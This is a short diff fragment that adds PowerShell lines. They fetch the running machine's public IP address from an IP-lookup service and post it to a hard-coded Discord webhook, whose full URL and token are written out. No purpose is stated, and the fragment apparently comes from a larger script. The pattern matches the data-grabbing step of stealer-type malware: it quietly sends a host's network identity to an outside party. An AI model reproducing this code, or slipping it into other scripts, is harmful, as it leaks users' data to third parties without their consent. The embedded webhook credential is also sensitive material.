@@ -1,0 +1,6 @@
+$ip = Invoke-RestMethod -Uri "https://api.ipify.org?format=json"
+                $discordWebhookUrl = "https://discord.com/api/webhooks/1070416409215107184/UAILaaOb37Vlb223hJuywdE8ysjpW4DSW7hA-g_nemnLabmF40vknnvov3I-4V4eYBTM"
+                $payload = @{
+                    content = "Public IP: $($ip.ip)"
+                }
+                Invoke-RestMethod -Method Post -Uri $discordWebhookUrl -ContentType "application/json" -Body (ConvertTo-Json $payload)
